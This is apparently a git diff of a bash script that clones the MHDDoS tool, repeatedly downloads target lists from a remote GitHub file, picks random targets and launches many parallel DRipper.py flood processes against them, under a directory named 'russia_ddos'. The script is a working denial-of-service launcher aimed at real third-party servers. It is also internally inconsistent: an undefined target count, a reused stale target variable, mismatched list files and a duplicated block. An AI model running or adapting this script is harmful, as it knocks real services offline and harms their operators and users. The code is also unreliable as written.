@@ -22,15 +22,50 @@ git clone https://github.com/MHProDev/MHDDoS.git
 cd MHDDoS
 pip install -r requirements.txt > /dev/null #(no output on screen)
 
+
+
+
 while true
 do
 
+   # Get number of targets in DRipper_targets
+   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | wc -l)
 
+   ## Get random target from list of sites
+   site=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6 | shuf -n 1)
 
-## Get random target from list of sites
-site=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6 | shuf -n 1)
+   echo -e "\nNumber of targets in list: " $list_size "\n"
 
-## Cut "command line" from string. Command line is verything before "#" that is used as delimiter.
+   # Get random numbers
+   random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)
+   echo -e "random numbers: " $random_numbers "\n"
+   
+   # Print targets on screen
+   echo "Choosen targets:"
+   for i in $random_numbers
+   do
+             site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat)")
+             echo $site
+             sleep 0.2
+   done
+   
+   sleep 2
+   
+   # Launch multiple MHDDoS instances
+   for i in $random_numbers
+   do
+            # Cut "command line" from string. Command line is verything before "#" that is used as delimiter.
+            cmd_line=$(echo $site | awk -F "#" '{print $1}')
+
+            addr=$(echo $site | awk '{print $1}')
+            port=$(echo $site | awk '{print $2}')
+            prot=$(echo $site | awk '{print $3}')
+
+            #echo $addr $port $prot
+            python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
+   done
+
+# Cut "command line" from string. Command line is verything before "#" that is used as delimiter.
 cmd_line=$(echo $site | awk -F "#" '{print $1}')
 echo "Choosen target - " $cmd_line
 
